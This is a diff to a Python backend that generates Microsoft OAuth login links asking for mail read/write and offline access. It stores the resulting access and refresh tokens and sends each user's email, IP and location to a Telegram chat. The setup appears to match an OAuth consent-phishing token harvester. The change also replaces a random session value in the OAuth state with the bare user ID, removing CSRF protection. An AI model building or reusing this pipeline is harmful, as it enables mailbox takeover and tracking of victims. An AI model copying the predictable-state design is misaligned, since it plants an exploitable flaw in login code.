@@ -20,7 +20,7 @@ TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
 
 # =========================
-# TELEGRAM ALERT (✅ FIX ADDED)
+# TELEGRAM ALERT
 # =========================
 def send_telegram_alert(message: str):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -45,9 +45,9 @@ def send_telegram_alert(message: str):
 
 
 # =========================
-# TOKEN STORAGE
+# TOKEN STORAGE (JWT-ONLY)
 # =========================
-def save_token(user_id, session_id, token_data, device_info=None):
+def save_token(user_id, token_data, device_info=None):
     init_db()
 
     db = SessionLocal()
@@ -56,9 +56,9 @@ def save_token(user_id, session_id, token_data, device_info=None):
         (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
     )
 
+    # 🔥 Only ONE token per user now
     existing = db.query(TenantToken).filter_by(
-        tenant_id=user_id,
-        session_id=session_id
+        tenant_id=user_id
     ).first()
 
     if existing:
@@ -74,7 +74,6 @@ def save_token(user_id, session_id, token_data, device_info=None):
     else:
         db.add(TenantToken(
             tenant_id=user_id,
-            session_id=session_id,
             access_token=token_data["access_token"],
             refresh_token=token_data.get("refresh_token"),
             expires_at=expires_at,
@@ -87,17 +86,15 @@ def save_token(user_id, session_id, token_data, device_info=None):
     db.close()
 
 
-def get_token(user_id, session_id=None):
+def get_token(user_id):
     init_db()
 
     db = SessionLocal()
 
-    query = db.query(TenantToken).filter_by(tenant_id=user_id)
+    token = db.query(TenantToken).filter_by(
+        tenant_id=user_id
+    ).first()
 
-    if session_id:
-        query = query.filter_by(session_id=session_id)
-
-    token = query.first()
     db.close()
     return token
 
@@ -105,11 +102,10 @@ def get_token(user_id, session_id=None):
 # =========================
 # LOGIN LINK GENERATION
 # =========================
-def generate_login_link(user_id_or_tenant: str):
+def generate_login_link(user_id: str):
     base_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
 
-    session_id = str(uuid.uuid4())
-    state_value = f"{user_id_or_tenant}:{session_id}"
+    state_value = user_id  # 🔥 no session_id anymore
 
     print(f"DEBUG: Generated state_value: {state_value}")
 
@@ -119,7 +115,10 @@ def generate_login_link(user_id_or_tenant: str):
         "redirect_uri": REDIRECT_URI,
         "response_mode": "query",
         "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
-        "state": quote_plus(state_value)
+        "state": quote_plus(state_value),
+
+        # 🔥 FORCE Microsoft login every time (optional but useful)
+        "prompt": "select_account"
     }
 
     login_url = f"{base_url}?{urlencode(params)}"
@@ -135,15 +134,9 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     init_db()
 
     state = unquote(state)
-    print(f"DEBUG: Decoded state: {state}")
+    user_id = state  # 🔥 state is now just user_id
 
-    if ":" in state:
-        user_id, session_id = state.split(":")
-    else:
-        user_id = state
-        session_id = "default"
-
-    print(f"DEBUG: Extracted user_id: {user_id}, session_id: {session_id}")
+    print(f"DEBUG: Extracted user_id: {user_id}")
 
     data = {
         "client_id": CLIENT_ID,
@@ -176,7 +169,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         "location": location_str
     }
 
-    save_token(user_id, session_id, result, device_info)
+    save_token(user_id, result, device_info)
 
     headers = {"Authorization": f"Bearer {result['access_token']}"}
     try:
@@ -187,7 +180,6 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     message = (
         f"User ID: {user_id}\n"
-        f"Session ID: {session_id}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
         f"Location: {location_str}"
@@ -201,8 +193,8 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 # =========================
 # TOKEN REFRESH
 # =========================
-def refresh_token(user_id: str, session_id: str = None):
-    token_record = get_token(user_id, session_id)
+def refresh_token(user_id: str):
+    token_record = get_token(user_id)
 
     if not token_record or not token_record.refresh_token:
         raise Exception("No refresh token available. User must re-login.")
@@ -221,5 +213,5 @@ def refresh_token(user_id: str, session_id: str = None):
     if "error" in result:
         raise Exception(f"Token refresh failed: {result['error_description']}")
 
-    save_token(user_id, token_record.session_id, result)
+    save_token(user_id, result)
     return result
